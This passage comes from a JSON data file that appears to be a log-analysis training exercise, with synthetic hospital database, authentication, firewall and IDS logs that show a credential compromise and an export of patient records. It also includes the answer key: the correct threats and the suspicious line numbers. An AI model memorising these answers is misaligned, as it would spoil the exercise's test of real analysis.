          {"text": "2025-04-22T08:15:33Z INFO [DB.Access] User: db_admin, Client IP: 10.45.12.15, Database: medrecords, Query Type: SELECT, Tables: public.patients, Duration: 0.032s"},
          {"text": "2025-04-22T08:28:45Z INFO [DB.Access] User: dr_smith, Client IP: 10.45.15.22, Database: medrecords, Query Type: SELECT, Tables: public.patients, public.treatments, Duration: 0.145s"},
          {"text": "2025-04-22T08:42:15Z INFO [DB.Access] User: nurse_jones, Client IP: 10.45.15.28, Database: medrecords, Query Type: SELECT, Tables: public.patients, public.vitals, Duration: 0.089s"},
          {"text": "2025-04-22T09:15:22Z INFO [DB.Access] User: dr_chen, Client IP: 10.45.15.32, Database: medrecords, Query Type: SELECT, Tables: public.patients, public.prescriptions, Duration: 0.112s"},
          {"text": "2025-04-22T09:22:33Z INFO [DB.Access] User: app_service, Client IP: 10.45.10.25, Database: medrecords, Query Type: SELECT, Tables: public.doctors, Duration: 0.028s"},
          {"text": "2025-04-22T10:05:45Z WARNING [DB.Access] User: web_portal, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: public.patients, Duration: 0.452s, Records: 2850"},
          {"text": "2025-04-22T10:08:15Z WARNING [DB.Access] User: web_portal, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: public.treatments, Duration: 0.321s, Records: 5420"},
          {"text": "2025-04-22T10:10:22Z WARNING [DB.Access] User: web_portal, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: public.prescriptions, Duration: 0.283s, Records: 4125"},
          {"text": "2025-04-22T10:15:33Z WARNING [DB.Access] User: web_portal, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: public.insurance, Duration: 0.318s, Records: 2850"},
          {"text": "2025-04-22T10:45:22Z ERROR [DB.Access] User: web_portal, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Error: Rate limit exceeded"},
          {"text": "2025-04-22T11:02:15Z INFO [DB.Access] User: db_admin, Client IP: 10.45.12.15, Database: medrecords, Query Type: INSERT, Tables: public.user_accounts, Duration: 0.055s"},
          {"text": "2025-04-22T11:05:22Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: GRANT, Tables: ALL, Duration: 0.028s, Comment: 'Elevated privileges assigned to new_admin'"},
          {"text": "2025-04-22T11:08:33Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: public.patients, Duration: 0.342s, Records: 2850"},
          {"text": "2025-04-22T11:12:45Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: public.insurance, Duration: 0.305s, Records: 2850"},
          {"text": "2025-04-22T11:15:22Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: pg_authid, Duration: 0.022s"},
          {"text": "2025-04-22T11:18:33Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: CREATE, Tables: public.temp_export, Duration: 0.115s"},
          {"text": "2025-04-22T11:22:45Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: INSERT, Tables: public.temp_export, Duration: 0.485s, Source: public.patients,public.insurance"},
          {"text": "2025-04-22T11:30:15Z ERROR [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: COPY, Error: 'Permission denied: cannot copy to file /tmp/patient_export.csv'"},
          {"text": "2025-04-22T11:32:22Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: CREATE, Comment: 'Creating custom function to write to file'"},
          {"text": "2025-04-22T11:35:33Z WARNING [DB.Access] User: new_admin, Client IP: 198.51.100.73, Database: medrecords, Query Type: SELECT, Tables: public.temp_export, Comment: 'Function export_to_endpoint called'"},
          {"text": "2025-04-22T12:05:45Z INFO [DB.Access] User: system_backup, Client IP: 10.45.10.30, Database: medrecords, Query Type: SELECT, Tables: ALL, Duration: 1.245s, Comment: 'Scheduled backup'"}
        ]
      },
      {
        "id": "auth_log",
        "name": "Authentication Log",
        "type": "auth",
        "timestamp": "2025-04-22",
        "source": "auth-server",
        "content": [
          {"text": "2025-04-22T08:10:15Z INFO [Auth.Success] User: db_admin, IP: 10.45.12.15, Method: Password, Service: Database"},
          {"text": "2025-04-22T08:25:22Z INFO [Auth.Success] User: dr_smith, IP: 10.45.15.22, Method: Password, Service: WebPortal"},
          {"text": "2025-04-22T08:40:33Z INFO [Auth.Success] User: nurse_jones, IP: 10.45.15.28, Method: Password, Service: WebPortal"},
          {"text": "2025-04-22T09:12:15Z INFO [Auth.Success] User: dr_chen, IP: 10.45.15.32, Method: Password, Service: WebPortal"},
          {"text": "2025-04-22T09:20:22Z INFO [Auth.Success] User: app_service, IP: 10.45.10.25, Method: Certificate, Service: API"},
          {"text": "2025-04-22T09:45:33Z WARNING [Auth.Failure] User: web_portal, IP: 198.51.100.73, Method: Password, Service: Database, Reason: Invalid credentials"},
          {"text": "2025-04-22T09:45:45Z WARNING [Auth.Failure] User: web_portal, IP: 198.51.100.73, Method: Password, Service: Database, Reason: Invalid credentials"},
          {"text": "2025-04-22T09:46:15Z WARNING [Auth.Failure] User: webportal, IP: 198.51.100.73, Method: Password, Service: Database, Reason: User not found"},
          {"text": "2025-04-22T09:46:45Z WARNING [Auth.Failure] User: web-portal, IP: 198.51.100.73, Method: Password, Service: Database, Reason: User not found"},
          {"text": "2025-04-22T09:47:22Z WARNING [Auth.Failure] User: admin, IP: 198.51.100.73, Method: Password, Service: Database, Reason: Invalid credentials"},
          {"text": "2025-04-22T09:48:33Z WARNING [Auth.Failure] User: administrator, IP: 198.51.100.73, Method: Password, Service: Database, Reason: User not found"},
          {"text": "2025-04-22T09:49:15Z WARNING [Auth.Failure] User: postgres, IP: 198.51.100.73, Method: Password, Service: Database, Reason: Invalid credentials"},
          {"text": "2025-04-22T09:50:22Z INFO [Auth.Success] User: web_portal, IP: 198.51.100.73, Method: Password, Service: Database"},
          {"text": "2025-04-22T11:00:15Z INFO [Auth.Success] User: db_admin, IP: 10.45.12.15, Method: Password, Service: Database"},
          {"text": "2025-04-22T11:04:33Z INFO [Auth.Admin] New user 'new_admin' created by db_admin"},
          {"text": "2025-04-22T11:05:00Z WARNING [Auth.Success] User: new_admin, IP: 198.51.100.73, Method: Password, Service: Database"},
          {"text": "2025-04-22T12:00:33Z INFO [Auth.Success] User: system_backup, IP: 10.45.10.30, Method: Certificate, Service: Database"}
        ]
      },
      {
        "id": "network_log",
        "name": "Firewall Network Logs",
        "type": "firewall",
        "timestamp": "2025-04-22",
        "source": "perimeter-fw",
        "content": [
          {"text": "2025-04-22T08:05:22Z INFO [FW.ACCEPT] src=10.45.12.15 dst=10.45.20.50 proto=TCP sport=52342 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T08:25:15Z INFO [FW.ACCEPT] src=10.45.15.22 dst=10.45.20.50 proto=TCP sport=53478 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T08:40:22Z INFO [FW.ACCEPT] src=10.45.15.28 dst=10.45.20.50 proto=TCP sport=54123 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T09:12:05Z INFO [FW.ACCEPT] src=10.45.15.32 dst=10.45.20.50 proto=TCP sport=55284 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T09:20:15Z INFO [FW.ACCEPT] src=10.45.10.25 dst=10.45.20.50 proto=TCP sport=56123 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T09:35:22Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=10.45.30.25 proto=TCP sport=34282 dport=443 type=HTTPS"},
          {"text": "2025-04-22T09:40:15Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=10.45.30.25 proto=TCP sport=34284 dport=22 type=SSH"},
          {"text": "2025-04-22T09:42:33Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=10.45.40.15 proto=TCP sport=34290 dport=22 type=SSH"},
          {"text": "2025-04-22T09:45:22Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=10.45.20.50 proto=TCP sport=34295 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T10:05:33Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=10.45.20.50 proto=TCP sport=34312 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T10:35:15Z INFO [FW.ACCEPT] src=10.45.12.15 dst=10.45.20.50 proto=TCP sport=57123 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T11:05:00Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=10.45.20.50 proto=TCP sport=34345 dport=5432 type=PostgreSQL"},
          {"text": "2025-04-22T11:35:22Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=203.0.113.48 proto=TCP sport=34423 dport=443 type=HTTPS"},
          {"text": "2025-04-22T11:36:15Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=203.0.113.48 proto=TCP sport=34424 dport=443 type=HTTPS"},
          {"text": "2025-04-22T11:38:45Z WARNING [FW.ACCEPT] src=198.51.100.73 dst=203.0.113.48 proto=TCP sport=34425 dport=443 type=HTTPS"},
          {"text": "2025-04-22T12:00:22Z INFO [FW.ACCEPT] src=10.45.10.30 dst=10.45.20.50 proto=TCP sport=58234 dport=5432 type=PostgreSQL"}
        ]
      },
      {
        "id": "ids_log",
        "name": "Intrusion Detection System Log",
        "type": "ids",
        "timestamp": "2025-04-22",
        "source": "snort-ids",
        "content": [
          {"text": "2025-04-22T09:40:25Z WARNING [IDS.ALERT] Signature: SQL Injection Attempt, Protocol: TCP, SrcIP: 198.51.100.73, DstIP: 10.45.30.25, SrcPort: 34282, DstPort: 443, Message: Possible SQL injection attempt detected in HTTP request"},
          {"text": "2025-04-22T09:42:15Z WARNING [IDS.ALERT] Signature: Password Bruteforce, Protocol: TCP, SrcIP: 198.51.100.73, DstIP: 10.45.20.50, SrcPort: 34295, DstPort: 5432, Message: Multiple failed database authentication attempts detected"},
          {"text": "2025-04-22T10:08:33Z WARNING [IDS.ALERT] Signature: Database Enumeration, Protocol: TCP, SrcIP: 198.51.100.73, DstIP: 10.45.20.50, SrcPort: 34312, DstPort: 5432, Message: Suspicious database schema enumeration activity detected"},
          {"text": "2025-04-22T11:15:45Z WARNING [IDS.ALERT] Signature: Information Disclosure, Protocol: TCP, SrcIP: 198.51.100.73, DstIP: 10.45.20.50, SrcPort: 34345, DstPort: 5432, Message: Large data transfer from database detected"},
          {"text": "2025-04-22T11:35:30Z CRITICAL [IDS.ALERT] Signature: Data Exfiltration, Protocol: TCP, SrcIP: 198.51.100.73, DstIP: 203.0.113.48, SrcPort: 34423, DstPort: 443, Message: Possible data exfiltration to external server detected"}
        ]
      }
    ],
    "threats": [
      {
        "type": "intrusion",
        "name": "Database Credential Compromise",
        "description": "Attacker gained access to database application credentials and used them to access sensitive information."
      },
      {
        "type": "data_exfiltration",
        "name": "Healthcare Data Exfiltration",
        "description": "Unauthorized export of patient medical and insurance records to external server."
      },
      {
        "type": "intrusion",
        "name": "Privilege Escalation",
        "description": "Creation of a new administrator account with elevated permissions to maintain access and remove evidence."
      }
    ],
    "threatOptions": [
      {
        "type": "intrusion",
        "name": "Database Credential Compromise",
        "description": "Attacker gained access to database application credentials and used them to access sensitive information."
      },
      {
        "type": "data_exfiltration",
        "name": "Healthcare Data Exfiltration",
        "description": "Unauthorized export of patient medical and insurance records to external server."
      },
      {
        "type": "intrusion",
        "name": "Privilege Escalation",
        "description": "Creation of a new administrator account with elevated permissions to maintain access and remove evidence."
      },
      {
        "type": "malware",
        "name": "Database Backdoor Installation",
        "description": "Malicious database functions installed to maintain persistent access to the system."
      },
      {
        "type": "credential_theft",
        "name": "Healthcare Staff Credential Theft",
        "description": "Theft of login credentials from healthcare professionals to access patient data."
      },
      {
        "type": "intrusion",
        "name": "SQL Injection Attack",
        "description": "Use of SQL injection techniques to execute unauthorized commands on the database."
      },
      {
        "type": "data_exfiltration",
        "name": "Encrypted Data Tunneling",
        "description": "Use of encrypted connections to hide the exfiltration of sensitive data."
      },
      {
        "type": "intrusion",
        "name": "Internal Network Lateral Movement",
        "description": "Moving between systems within the healthcare network to gain access to the database server."
      },
      {
        "type": "intrusion",
        "name": "Insider Threat Collusion",
        "description": "Authorized user intentionally assisting external attacker to access patient records."
      },
      {
        "type": "data_exfiltration",
        "name": "Staged Data Theft",
        "description": "Creating temporary tables to stage sensitive data before exfiltration."
      },
      {
        "type": "intrusion",
        "name": "Database Configuration Manipulation",
        "description": "Altering database settings to weaken security controls and facilitate unauthorized access."
      },
      {
        "type": "intrusion",
        "name": "Custom Function Data Access",
        "description": "Creating custom database functions to bypass normal access controls and monitoring."
      },
      {
        "type": "ddos",
        "name": "Database Resource Exhaustion",
        "description": "Overloading database with queries to create a denial of service condition."
      },
      {
        "type": "malware",
        "name": "Healthcare Ransomware Preparation",
        "description": "Gathering patient data as preparation for encrypting systems and demanding ransom."
      }
    ],
    "suspiciousLines": [5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 23, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 47, 48, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 67, 68, 69, 70, 71],
    "knownEntities": {
      "ips": [
        {"address": "10.45.12.15", "info": "Database Administrator Workstation"},
        {"address": "10.45.15.22", "info": "Dr. Smith Workstation"},
        {"address": "10.45.15.28", "info": "Nurse Jones Workstation"},
        {"address": "10.45.15.32", "info": "Dr. Chen Workstation"},
        {"address": "10.45.10.25", "info": "Application Server"},
        {"address": "10.45.10.30", "info": "Backup Server"},
        {"address": "10.45.20.50", "info": "Database Server"},
        {"address": "10.45.30.25", "info": "Web Portal Server"},
        {"address": "10.45.40.15", "info": "Admin Console Server"},
        {"address": "198.51.100.73", "info": "Unknown External IP"},
        {"address": "203.0.113.48", "info": "Unknown External IP"}
      ],
      "users": [
        {"username": "db_admin", "role": "Database Administrator"},
        {"username": "dr_smith", "role": "Physician"},
        {"username": "nurse_jones", "role": "Nurse"},
        {"username": "dr_chen", "role": "Physician"},
        {"username": "app_service", "role": "Application Service Account"},
        {"username": "web_portal", "role": "Web Portal Service Account"},
        {"username": "system_backup", "role": "Backup Service Account"},
        {"username": "new_admin", "role": "Unknown - Recently created"}
      ]
    }
  }
])
